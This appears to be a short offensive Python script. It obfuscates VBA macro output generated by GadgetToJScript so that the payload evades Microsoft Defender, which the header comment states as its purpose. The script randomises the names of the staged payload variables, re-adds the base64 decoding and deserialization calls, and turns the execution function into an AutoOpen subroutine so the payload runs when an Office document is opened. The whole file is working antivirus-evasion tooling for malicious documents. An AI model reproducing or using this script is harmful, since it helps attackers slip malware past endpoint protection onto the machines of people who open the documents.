#!/usr/bin/env python3
#
# DUMB obfuscator for Gadget2JScript VBA output for bypassing Defender (as of 2022-12-31)
#

import sys
import random
import string

def get_random_string(length):
    return ''.join(random.choice(string.ascii_letters) for i in range(length))

if len(sys.argv) != 2:
    print("USAGE: {} <g2js_vba_output_filename>".format(sys.argv[0]))
    exit(1)

stage1 = get_random_string(8)
stage2 = get_random_string(8)
count = 0

with open(sys.argv[1], "r") as f:
    for line in f:
        t = line.strip()
        if t == "Dim Decstage_1":
            print("Dim stage_{}".format(stage1))
            print("stage_{} = stage_1".format(stage1))
            print(t)
            print("Decstage_1 = b64Decode(stage_{})".format(stage1))
            f.readline()
        elif t == "Dim Decstage_2":
            print("Dim stage_{}".format(stage2))
            print("stage_{} = stage_2".format(stage2))
            print(t)
            print("Decstage_2 = b64Decode(stage_{})".format(stage2))
            f.readline()
        elif t == "Dim o1 As Object":
            print("fmt_1.Deserialize_2 stm_1")
            f.readline()
        elif t == "Dim o2 As Object":
            print("fmt_1.Deserialize_2 stm_2")
            f.readline()
        elif t == "Function Exec()":
            print("Sub AutoOpen()")
        elif t == "End Function":
            if count > 0:
                print("End Sub")
            else:
                print(t)
                count = 1
        else:
            print(t)
